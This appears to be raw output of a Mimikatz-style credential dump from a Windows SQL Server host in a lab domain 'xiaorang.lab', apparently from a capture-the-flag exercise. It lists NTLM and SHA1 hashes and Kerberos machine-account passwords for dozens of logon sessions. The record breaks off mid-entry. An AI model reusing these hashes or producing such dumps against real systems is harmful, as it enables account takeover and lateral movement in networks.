Authentication Id : 0 ; 228600 (00000000:00037cf8)
Session           : Interactive from 0
User Name         : MSSQLSERVER02
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2024/7/23 13:48:29
SID               : S-1-5-21-1403470932-1755135066-2609122076-1005
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER02
     * Domain   : MSSQLSERVER
     * NTLM     : 3aa518732551a136003ea41f9599a1ec
     * SHA1     : 6f1ed1f677201d998667bd8e3b81cfb52b9a138a
    tspkg :
    wdigest :
     * Username : MSSQLSERVER02
     * Domain   : MSSQLSERVER
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER02
     * Domain   : MSSQLSERVER
     * Password : (null)
    ssp :
    credman :

Authentication Id : 0 ; 93685 (00000000:00016df5)
Session           : Service from 0
User Name         : MSSQLServerOLAPService
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2024/7/23 13:48:07
SID               : S-1-5-80-2872255330-672591203-888807865-2791174282-1554802921
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * NTLM     : 302393922f8920b52b9724a8e3d735bb
     * SHA1     : 4bf600cf8f039a3685b643424c0626296e4977e6
    tspkg :
    wdigest :
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER$
     * Domain   : xiaorang.lab
     * Password : 9a 7a 2c ef 2f c9 f3 36 b7 f3 8f 95 a5 99 2e 7e 64 55 8c bc 6d 74 a5 24 39 76 e8 7e 83 6d 52 77 cf 6f 1c 52 07 6e 5f de cb 48 69 a7 49 33 ab b2 fe 3e a5 48 f3 49 26 2d 59 1f 7a 37 8c 72 85 3c b7 16 85 ef dc 3c 6f 09 fd 9a fc ae 77 00 4b 9b 2e 91 0c 08 88 40 d6 13 0f e6 fb 66 b7 6d d9 7e 04 84 b0 d9 66 6c 35 7b 2f 16 63 e6 61 12 da 01 e8 05 c5 5b 53 b2 c4 cf 60 71 6d b1 77 7f a6 99 c1 e5 3d 3a a7 b6 4f 74 0f a0 ad 9c 48 1b c3 14 5d 0a dc ce c3 df 3d ee 5e 4b 40 7a 07 24 52 6c 7b 5c f8 c0 2f eb 35 77 d2 01 c1 55 82 f1 ba 8c f4 00 e8 7f 42 30 b0 78 98 bb bd 9e 6d 48 7d bb 7b 9e 23 cf eb 7c 3e 01 b5 fd 50 f5 a9 4c ca bb 05 93 41 ef 0a 7d b3 09 ef e6 9c e5 19 1a 29 8b 88 1e 9b 6f f0 42 8e 71 86 67 28 a2 a2 90 d5 93
    ssp :
    credman :

Authentication Id : 0 ; 62999 (00000000:0000f617)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2024/7/23 13:48:05
SID               : S-1-5-90-0-1
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * NTLM     : cea3e66a2715c71423e7d3f0ff6cd352
     * SHA1     : 6de4e8f192569bbc44ae94f273870635ae878094
    tspkg :
    wdigest :
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER$
     * Domain   : xiaorang.lab
     * Password : (p4Spnv`&9xTZ=D'D/lz[a:94O:$E!7&zfcMza9k;Se"&>cBCBU0bxw.xL"B>\GmtUT,<:q3Yxfq#`O3sLI;OK" (_T_T5- $zV]-i;)c$qIj&$RgttdZI"m
    ssp :
    credman :

Authentication Id : 0 ; 62979 (00000000:0000f603)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2024/7/23 13:48:05
SID               : S-1-5-90-0-1
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * NTLM     : 302393922f8920b52b9724a8e3d735bb
     * SHA1     : 4bf600cf8f039a3685b643424c0626296e4977e6
    tspkg :
    wdigest :
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER$
     * Domain   : xiaorang.lab
     * Password : 9a 7a 2c ef 2f c9 f3 36 b7 f3 8f 95 a5 99 2e 7e 64 55 8c bc 6d 74 a5 24 39 76 e8 7e 83 6d 52 77 cf 6f 1c 52 07 6e 5f de cb 48 69 a7 49 33 ab b2 fe 3e a5 48 f3 49 26 2d 59 1f 7a 37 8c 72 85 3c b7 16 85 ef dc 3c 6f 09 fd 9a fc ae 77 00 4b 9b 2e 91 0c 08 88 40 d6 13 0f e6 fb 66 b7 6d d9 7e 04 84 b0 d9 66 6c 35 7b 2f 16 63 e6 61 12 da 01 e8 05 c5 5b 53 b2 c4 cf 60 71 6d b1 77 7f a6 99 c1 e5 3d 3a a7 b6 4f 74 0f a0 ad 9c 48 1b c3 14 5d 0a dc ce c3 df 3d ee 5e 4b 40 7a 07 24 52 6c 7b 5c f8 c0 2f eb 35 77 d2 01 c1 55 82 f1 ba 8c f4 00 e8 7f 42 30 b0 78 98 bb bd 9e 6d 48 7d bb 7b 9e 23 cf eb 7c 3e 01 b5 fd 50 f5 a9 4c ca bb 05 93 41 ef 0a 7d b3 09 ef e6 9c e5 19 1a 29 8b 88 1e 9b 6f f0 42 8e 71 86 67 28 a2 a2 90 d5 93
    ssp :
    credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MSSQLSERVER$
Domain            : XIAORANG
Logon Server      : (null)
Logon Time        : 2024/7/23 13:48:05
SID               : S-1-5-20
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * NTLM     : 302393922f8920b52b9724a8e3d735bb
     * SHA1     : 4bf600cf8f039a3685b643424c0626296e4977e6
    tspkg :
    wdigest :
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :
     * Username : mssqlserver$
     * Domain   : XIAORANG.LAB
     * Password : 9a 7a 2c ef 2f c9 f3 36 b7 f3 8f 95 a5 99 2e 7e 64 55 8c bc 6d 74 a5 24 39 76 e8 7e 83 6d 52 77 cf 6f 1c 52 07 6e 5f de cb 48 69 a7 49 33 ab b2 fe 3e a5 48 f3 49 26 2d 59 1f 7a 37 8c 72 85 3c b7 16 85 ef dc 3c 6f 09 fd 9a fc ae 77 00 4b 9b 2e 91 0c 08 88 40 d6 13 0f e6 fb 66 b7 6d d9 7e 04 84 b0 d9 66 6c 35 7b 2f 16 63 e6 61 12 da 01 e8 05 c5 5b 53 b2 c4 cf 60 71 6d b1 77 7f a6 99 c1 e5 3d 3a a7 b6 4f 74 0f a0 ad 9c 48 1b c3 14 5d 0a dc ce c3 df 3d ee 5e 4b 40 7a 07 24 52 6c 7b 5c f8 c0 2f eb 35 77 d2 01 c1 55 82 f1 ba 8c f4 00 e8 7f 42 30 b0 78 98 bb bd 9e 6d 48 7d bb 7b 9e 23 cf eb 7c 3e 01 b5 fd 50 f5 a9 4c ca bb 05 93 41 ef 0a 7d b3 09 ef e6 9c e5 19 1a 29 8b 88 1e 9b 6f f0 42 8e 71 86 67 28 a2 a2 90 d5 93
    ssp :
    credman :

Authentication Id : 0 ; 6718721 (00000000:00668501)
Session           : RemoteInteractive from 2
User Name         : randark
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2024/7/23 16:38:37
SID               : S-1-5-21-1403470932-1755135066-2609122076-1027
    msv :
     [00000003] Primary
     * Username : randark
     * Domain   : MSSQLSERVER
     * NTLM     : 3008c87294511142799dca1191e69a0f
     * SHA1     : b7bc3a1b04d9e165c6762b0a1cde5226df5b6a6a
    tspkg :
    wdigest :
     * Username : randark
     * Domain   : MSSQLSERVER
     * Password : (null)
    kerberos :
     * Username : randark
     * Domain   : MSSQLSERVER
     * Password : (null)
    ssp :
    credman :

Authentication Id : 0 ; 230362 (00000000:000383da)
Session           : Interactive from 0
User Name         : MSSQLSERVER19
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2024/7/23 13:48:29
SID               : S-1-5-21-1403470932-1755135066-2609122076-1022
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER19
     * Domain   : MSSQLSERVER
     * NTLM     : 9ce3bb5769303e1258f792792310e33b
     * SHA1     : 1a2452c461d89c45f199454f59771f17423e72f9
    tspkg :
    wdigest :
     * Username : MSSQLSERVER19
     * Domain   : MSSQLSERVER
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER19
     * Domain   : MSSQLSERVER
     * Password : (null)
    ssp :
    credman :

Authentication Id : 0 ; 230248 (00000000:00038368)
Session           : Interactive from 0
User Name         : MSSQLSERVER18
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2024/7/23 13:48:29
SID               : S-1-5-21-1403470932-1755135066-2609122076-1021
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER18
     * Domain   : MSSQLSERVER
     * NTLM     : 31de1b5e8995c7f91070f4a409599c50
     * SHA1     : 070c0d12760e50812236b5717c75222a206aace8
    tspkg :
    wdigest :
     * Username : MSSQLSERVER18
     * Domain   : MSSQLSERVER
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER18
     * Domain   : MSSQLSERVER
     * Password : (null)
    ssp :
    credman :

Authentication Id : 0 ; 230063 (00000000:000382af)
Session           : Interactive from 0
User Name         : MSSQLSERVER17
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2024/7/23 13:48:29
SID               : S-1-5-21-1403470932-1755135066-2609122076-1020
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER17
     * Domain   : MSSQLSERVER
     * NTLM     : 82fe575c8bb18d01df45eb54d0ebc3b4
     * SHA1     : 13b87dcba388982dcc44feeba232bb50aa29c7e9
    tspkg :
    wdigest :
     * Username : MSSQLSERVER17
     * Domain   : MSSQLSERVER
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER17
     * Domain   : MSSQLSERVER
     * Password : (null)
    ssp :
    credman :

Authentication Id : 0 ; 229824 (00000000:000381c0)
Session           : Interactive from 0
User Name         : MSSQLSERVER15
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2024/7/23 13:48:29
SID               : S-1-5-21-1403470932-1755135066-2609122076-1018
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER15
     * Domain   : MSSQLSERVER
     * NTLM     : 6eeb34930fa71d82a464ce235261effd
     * SHA1     : 1dfc6d66d9cfdbaa5fc091fedde9a3387771d09b
    tspkg :
    wdigest :
     * Username : MSSQLSERVER15
     * Domain   : MSSQLSERVER
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER15
     * Domain   : MSSQLSERVER
     * Password : (null)
    ssp :
    credman :

Authentication Id : 0 ; 229611 (00000000:000380eb)
Session           : Interactive from 0
User Name         : MSSQLSERVER13
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2024/7/23 13:48:29
SID               : S-1-5-21-1403470932-1755135066-2609122076-1016
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER13
     * Domain   : MSSQLSERVER
     * NTLM     : b808e9a53247721e84cc314c870080c5
     * SHA1     : 47a42f4a6eed2b2d90f342416f42e2696052f546
    tspkg :
    wdigest :
     * Username : MSSQLSERVER13
     * Domain   : MSSQLSERVER
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER13
     * Domain   : MSSQLSERVER
     * Password : (null)
    ssp :
    credman :

Authentication Id : 0 ; 229457 (00000000:00038051)
Session           : Interactive from 0
User Name         : MSSQLSERVER12
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2024/7/23 13:48:29
SID               : S-1-5-21-1403470932-1755135066-2609122076-1015
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER12
     * Domain   : MSSQLSERVER
     * NTLM     : 672702a4bd7524269b77dbb6b2e75911
     * SHA1     : c7a828609e4912ab752b43deda8351dc1a8ea240
    tspkg :
    wdigest :
     * Username : MSSQLSERVER12
     * Domain   : MSSQLSERVER
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER12
     * Domain   : MSSQLSERVER
     * Password : (null)
    ssp :
    credman :

Authentication Id : 0 ; 229334 (00000000:00037fd6)
Session           : Interactive from 0
User Name         : MSSQLSERVER11
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2024/7/23 13:48:29
SID               : S-1-5-21-1403470932-1755135066-2609122076-1014
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER11
     * Domain   : MSSQLSERVER
     * NTLM     : cee10216b2126aa1a3f239b8201120ef
     * SHA1     : 4867093fc519f7d1e91d80e3790ef8a17a7fdd18
    tspkg :
    wdigest :
     * Username : MSSQLSERVER11
     * Domain   : MSSQLSERVER
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER11
     * Domain   : MSSQLSERVER
     * Password : (null)
    ssp :
    credman :

Authentication Id : 0 ; 229252 (00000000:00037f84)
Session           : Interactive from 0
User Name         : MSSQLSERVER10
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2024/7/23 13:48:29
SID               : S-1-5-21-1403470932-1755135066-2609122076-1013
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER10
     * Domain   : MSSQLSERVER
     * NTLM     : c3e7aa593081ae1b210547da7d46819b
     * SHA1     : 3bf20cfece021438cf86617f5cabc5e7a69038f7
    tspkg :
    wdigest :
     * Username : MSSQLSERVER10
     * Domain   : MSSQLSERVER
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER10
     * Domain   : MSSQLSERVER
     * Password : (null)
    ssp :
    credman :

Authentication Id : 0 ; 229089 (00000000:00037ee1)
Session           : Interactive from 0
User Name         : MSSQLSERVER08
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2024/7/23 13:48:29
SID               : S-1-5-21-1403470932-1755135066-2609122076-1011
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER08
     * Domain   : MSSQLSERVER
     * NTLM     : 465034ebde60dfae889c3e493e1816bf
     * SHA1     : c96428917f7c8a15ea0370716dee153842afaf02
    tspkg :
    wdigest :
     * Username : MSSQLSERVER08
     * Domain   : MSSQLSERVER
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER08
     * Domain   : MSSQLSERVER
     * Password : (null)
    ssp :
    credman :

Authentication Id : 0 ; 229007 (00000000:00037e8f)
Session           : Interactive from 0
User Name         : MSSQLSERVER07
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2024/7/23 13:48:29
SID               : S-1-5-21-1403470932-1755135066-2609122076-1010
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER07
     * Domain   : MSSQLSERVER
     * NTLM     : f9f990df1bc869cc205d2513b788a5b8
     * SHA1     : 79746cfe5a2f1eec4350a6b64d87b01455ef9030
    tspkg :
    wdigest :
     * Username : MSSQLSERVER07
     * Domain   : MSSQLSERVER
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER07
     * Domain   : MSSQLSERVER
     * Password : (null)
    ssp :
    credman :

Authentication Id : 0 ; 228493 (00000000:00037c8d)
Session           : Interactive from 0
User Name         : MSSQLSERVER01
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2024/7/23 13:48:29
SID               : S-1-5-21-1403470932-1755135066-2609122076-1004
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER01
     * Domain   : MSSQLSERVER
     * NTLM     : ded5ad90b3d8560838a777039641c673
     * SHA1     : a2cd9d2963f29b162847e8a1a2c19d5e0641a162
    tspkg :
    wdigest :
     * Username : MSSQLSERVER01
     * Domain   : MSSQLSERVER
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER01
     * Domain   : MSSQLSERVER
     * Password : (null)
    ssp :
    credman :

Authentication Id : 0 ; 187665 (00000000:0002dd11)
Session           : Service from 0
User Name         : MSSQLFDLauncher
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2024/7/23 13:48:16
SID               : S-1-5-80-3263513310-3392720605-1798839546-683002060-3227631582
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * NTLM     : 302393922f8920b52b9724a8e3d735bb
     * SHA1     : 4bf600cf8f039a3685b643424c0626296e4977e6
    tspkg :
    wdigest :
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER$
     * Domain   : xiaorang.lab
     * Password : 9a 7a 2c ef 2f c9 f3 36 b7 f3 8f 95 a5 99 2e 7e 64 55 8c bc 6d 74 a5 24 39 76 e8 7e 83 6d 52 77 cf 6f 1c 52 07 6e 5f de cb 48 69 a7 49 33 ab b2 fe 3e a5 48 f3 49 26 2d 59 1f 7a 37 8c 72 85 3c b7 16 85 ef dc 3c 6f 09 fd 9a fc ae 77 00 4b 9b 2e 91 0c 08 88 40 d6 13 0f e6 fb 66 b7 6d d9 7e 04 84 b0 d9 66 6c 35 7b 2f 16 63 e6 61 12 da 01 e8 05 c5 5b 53 b2 c4 cf 60 71 6d b1 77 7f a6 99 c1 e5 3d 3a a7 b6 4f 74 0f a0 ad 9c 48 1b c3 14 5d 0a dc ce c3 df 3d ee 5e 4b 40 7a 07 24 52 6c 7b 5c f8 c0 2f eb 35 77 d2 01 c1 55 82 f1 ba 8c f4 00 e8 7f 42 30 b0 78 98 bb bd 9e 6d 48 7d bb 7b 9e 23 cf eb 7c 3e 01 b5 fd 50 f5 a9 4c ca bb 05 93 41 ef 0a 7d b3 09 ef e6 9c e5 19 1a 29 8b 88 1e 9b 6f f0 42 8e 71 86 67 28 a2 a2 90 d5 93
    ssp :
    credman :

Authentication Id : 0 ; 184396 (00000000:0002d04c)
Session           : Service from 0
User Name         : MSSQLLaunchpad
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2024/7/23 13:48:16
SID               : S-1-5-80-3477044410-376262199-2110164357-2030828471-4165405235
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * NTLM     : 302393922f8920b52b9724a8e3d735bb
     * SHA1     : 4bf600cf8f039a3685b643424c0626296e4977e6
    tspkg :
    wdigest :
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER$
     * Domain   : xiaorang.lab
     * Password : 9a 7a 2c ef 2f c9 f3 36 b7 f3 8f 95 a5 99 2e 7e 64 55 8c bc 6d 74 a5 24 39 76 e8 7e 83 6d 52 77 cf 6f 1c 52 07 6e 5f de cb 48 69 a7 49 33 ab b2 fe 3e a5 48 f3 49 26 2d 59 1f 7a 37 8c 72 85 3c b7 16 85 ef dc 3c 6f 09 fd 9a fc ae 77 00 4b 9b 2e 91 0c 08 88 40 d6 13 0f e6 fb 66 b7 6d d9 7e 04 84 b0 d9 66 6c 35 7b 2f 16 63 e6 61 12 da 01 e8 05 c5 5b 53 b2 c4 cf 60 71 6d b1 77 7f a6 99 c1 e5 3d 3a a7 b6 4f 74 0f a0 ad 9c 48 1b c3 14 5d 0a dc ce c3 df 3d ee 5e 4b 40 7a 07 24 52 6c 7b 5c f8 c0 2f eb 35 77 d2 01 c1 55 82 f1 ba 8c f4 00 e8 7f 42 30 b0 78 98 bb bd 9e 6d 48 7d bb 7b 9e 23 cf eb 7c 3e 01 b5 fd 50 f5 a9 4c ca bb 05 93 41 ef 0a 7d b3 09 ef e6 9c e5 19 1a 29 8b 88 1e 9b 6f f0 42 8e 71 86 67 28 a2 a2 90 d5 93
    ssp :
    credman :

Authentication Id : 0 ; 94805 (00000000:00017255)
Session           : Service from 0
User Name         : SSASTELEMETRY
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2024/7/23 13:48:07
SID               : S-1-5-80-1549978933-2891762758-2075524219-3728768389-1145206490
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * NTLM     : 302393922f8920b52b9724a8e3d735bb
     * SHA1     : 4bf600cf8f039a3685b643424c0626296e4977e6
    tspkg :
    wdigest :
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER$
     * Domain   : xiaorang.lab
     * Password : 9a 7a 2c ef 2f c9 f3 36 b7 f3 8f 95 a5 99 2e 7e 64 55 8c bc 6d 74 a5 24 39 76 e8 7e 83 6d 52 77 cf 6f 1c 52 07 6e 5f de cb 48 69 a7 49 33 ab b2 fe 3e a5 48 f3 49 26 2d 59 1f 7a 37 8c 72 85 3c b7 16 85 ef dc 3c 6f 09 fd 9a fc ae 77 00 4b 9b 2e 91 0c 08 88 40 d6 13 0f e6 fb 66 b7 6d d9 7e 04 84 b0 d9 66 6c 35 7b 2f 16 63 e6 61 12 da 01 e8 05 c5 5b 53 b2 c4 cf 60 71 6d b1 77 7f a6 99 c1 e5 3d 3a a7 b6 4f 74 0f a0 ad 9c 48 1b c3 14 5d 0a dc ce c3 df 3d ee 5e 4b 40 7a 07 24 52 6c 7b 5c f8 c0 2f eb 35 77 d2 01 c1 55 82 f1 ba 8c f4 00 e8 7f 42 30 b0 78 98 bb bd 9e 6d 48 7d bb 7b 9e 23 cf eb 7c 3e 01 b5 fd 50 f5 a9 4c ca bb 05 93 41 ef 0a 7d b3 09 ef e6 9c e5 19 1a 29 8b 88 1e 9b 6f f0 42 8e 71 86 67 28 a2 a2 90 d5 93
    ssp :
    credman :

Authentication Id : 0 ; 94712 (00000000:000171f8)
Session           : Service from 0
User Name         : SSISTELEMETRY130
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2024/7/23 13:48:07
SID               : S-1-5-80-1625532266-625503396-2441596095-4129757946-3375356652
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * NTLM     : 302393922f8920b52b9724a8e3d735bb
     * SHA1     : 4bf600cf8f039a3685b643424c0626296e4977e6
    tspkg :
    wdigest :
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER$
     * Domain   : xiaorang.lab
     * Password : 9a 7a 2c ef 2f c9 f3 36 b7 f3 8f 95 a5 99 2e 7e 64 55 8c bc 6d 74 a5 24 39 76 e8 7e 83 6d 52 77 cf 6f 1c 52 07 6e 5f de cb 48 69 a7 49 33 ab b2 fe 3e a5 48 f3 49 26 2d 59 1f 7a 37 8c 72 85 3c b7 16 85 ef dc 3c 6f 09 fd 9a fc ae 77 00 4b 9b 2e 91 0c 08 88 40 d6 13 0f e6 fb 66 b7 6d d9 7e 04 84 b0 d9 66 6c 35 7b 2f 16 63 e6 61 12 da 01 e8 05 c5 5b 53 b2 c4 cf 60 71 6d b1 77 7f a6 99 c1 e5 3d 3a a7 b6 4f 74 0f a0 ad 9c 48 1b c3 14 5d 0a dc ce c3 df 3d ee 5e 4b 40 7a 07 24 52 6c 7b 5c f8 c0 2f eb 35 77 d2 01 c1 55 82 f1 ba 8c f4 00 e8 7f 42 30 b0 78 98 bb bd 9e 6d 48 7d bb 7b 9e 23 cf eb 7c 3e 01 b5 fd 50 f5 a9 4c ca bb 05 93 41 ef 0a 7d b3 09 ef e6 9c e5 19 1a 29 8b 88 1e 9b 6f f0 42 8e 71 86 67 28 a2 a2 90 d5 93
    ssp :
    credman :

Authentication Id : 0 ; 94245 (00000000:00017025)
Session           : Service from 0
User Name         : SQLTELEMETRY
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2024/7/23 13:48:07
SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * NTLM     : 302393922f8920b52b9724a8e3d735bb
     * SHA1     : 4bf600cf8f039a3685b643424c0626296e4977e6
    tspkg :
    wdigest :
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER$
     * Domain   : xiaorang.lab
     * Password : 9a 7a 2c ef 2f c9 f3 36 b7 f3 8f 95 a5 99 2e 7e 64 55 8c bc 6d 74 a5 24 39 76 e8 7e 83 6d 52 77 cf 6f 1c 52 07 6e 5f de cb 48 69 a7 49 33 ab b2 fe 3e a5 48 f3 49 26 2d 59 1f 7a 37 8c 72 85 3c b7 16 85 ef dc 3c 6f 09 fd 9a fc ae 77 00 4b 9b 2e 91 0c 08 88 40 d6 13 0f e6 fb 66 b7 6d d9 7e 04 84 b0 d9 66 6c 35 7b 2f 16 63 e6 61 12 da 01 e8 05 c5 5b 53 b2 c4 cf 60 71 6d b1 77 7f a6 99 c1 e5 3d 3a a7 b6 4f 74 0f a0 ad 9c 48 1b c3 14 5d 0a dc ce c3 df 3d ee 5e 4b 40 7a 07 24 52 6c 7b 5c f8 c0 2f eb 35 77 d2 01 c1 55 82 f1 ba 8c f4 00 e8 7f 42 30 b0 78 98 bb bd 9e 6d 48 7d bb 7b 9e 23 cf eb 7c 3e 01 b5 fd 50 f5 a9 4c ca bb 05 93 41 ef 0a 7d b3 09 ef e6 9c e5 19 1a 29 8b 88 1e 9b 6f f0 42 8e 71 86 67 28 a2 a2 90 d5 93
    ssp :
    credman :

Authentication Id : 0 ; 93791 (00000000:00016e5f)
Session           : Service from 0
User Name         : ReportServer
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2024/7/23 13:48:07
SID               : S-1-5-80-2885764129-887777008-271615777-1616004480-2722851051
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * NTLM     : 302393922f8920b52b9724a8e3d735bb
     * SHA1     : 4bf600cf8f039a3685b643424c0626296e4977e6
    tspkg :
    wdigest :
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER$
     * Domain   : xiaorang.lab
     * Password : 9a 7a 2c ef 2f c9 f3 36 b7 f3 8f 95 a5 99 2e 7e 64 55 8c bc 6d 74 a5 24 39 76 e8 7e 83 6d 52 77 cf 6f 1c 52 07 6e 5f de cb 48 69 a7 49 33 ab b2 fe 3e a5 48 f3 49 26 2d 59 1f 7a 37 8c 72 85 3c b7 16 85 ef dc 3c 6f 09 fd 9a fc ae 77 00 4b 9b 2e 91 0c 08 88 40 d6 13 0f e6 fb 66 b7 6d d9 7e 04 84 b0 d9 66 6c 35 7b 2f 16 63 e6 61 12 da 01 e8 05 c5 5b 53 b2 c4 cf 60 71 6d b1 77 7f a6 99 c1 e5 3d 3a a7 b6 4f 74 0f a0 ad 9c 48 1b c3 14 5d 0a dc ce c3 df 3d ee 5e 4b 40 7a 07 24 52 6c 7b 5c f8 c0 2f eb 35 77 d2 01 c1 55 82 f1 ba 8c f4 00 e8 7f 42 30 b0 78 98 bb bd 9e 6d 48 7d bb 7b 9e 23 cf eb 7c 3e 01 b5 fd 50 f5 a9 4c ca bb 05 93 41 ef 0a 7d b3 09 ef e6 9c e5 19 1a 29 8b 88 1e 9b 6f f0 42 8e 71 86 67 28 a2 a2 90 d5 93
    ssp :
    credman :

Authentication Id : 0 ; 93082 (00000000:00016b9a)
Session           : Service from 0
User Name         : MsDtsServer130
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2024/7/23 13:48:07
SID               : S-1-5-80-3763098489-2620711134-3767674660-4164406483-1621732
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * NTLM     : 302393922f8920b52b9724a8e3d735bb
     * SHA1     : 4bf600cf8f039a3685b643424c0626296e4977e6
    tspkg :
    wdigest :
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER$
     * Domain   : xiaorang.lab
     * Password : 9a 7a 2c ef 2f c9 f3 36 b7 f3 8f 95 a5 99 2e 7e 64 55 8c bc 6d 74 a5 24 39 76 e8 7e 83 6d 52 77 cf 6f 1c 52 07 6e 5f de cb 48 69 a7 49 33 ab b2 fe 3e a5 48 f3 49 26 2d 59 1f 7a 37 8c 72 85 3c b7 16 85 ef dc 3c 6f 09 fd 9a fc ae 77 00 4b 9b 2e 91 0c 08 88 40 d6 13 0f e6 fb 66 b7 6d d9 7e 04 84 b0 d9 66 6c 35 7b 2f 16 63 e6 61 12 da 01 e8 05 c5 5b 53 b2 c4 cf 60 71 6d b1 77 7f a6 99 c1 e5 3d 3a a7 b6 4f 74 0f a0 ad 9c 48 1b c3 14 5d 0a dc ce c3 df 3d ee 5e 4b 40 7a 07 24 52 6c 7b 5c f8 c0 2f eb 35 77 d2 01 c1 55 82 f1 ba 8c f4 00 e8 7f 42 30 b0 78 98 bb bd 9e 6d 48 7d bb 7b 9e 23 cf eb 7c 3e 01 b5 fd 50 f5 a9 4c ca bb 05 93 41 ef 0a 7d b3 09 ef e6 9c e5 19 1a 29 8b 88 1e 9b 6f f0 42 8e 71 86 67 28 a2 a2 90 d5 93
    ssp :
    credman :

Authentication Id : 0 ; 92695 (00000000:00016a17)
Session           : Service from 0
User Name         : MSSQLSERVER
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2024/7/23 13:48:06
SID               : S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * NTLM     : 302393922f8920b52b9724a8e3d735bb
     * SHA1     : 4bf600cf8f039a3685b643424c0626296e4977e6
    tspkg :
    wdigest :
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER$
     * Domain   : xiaorang.lab
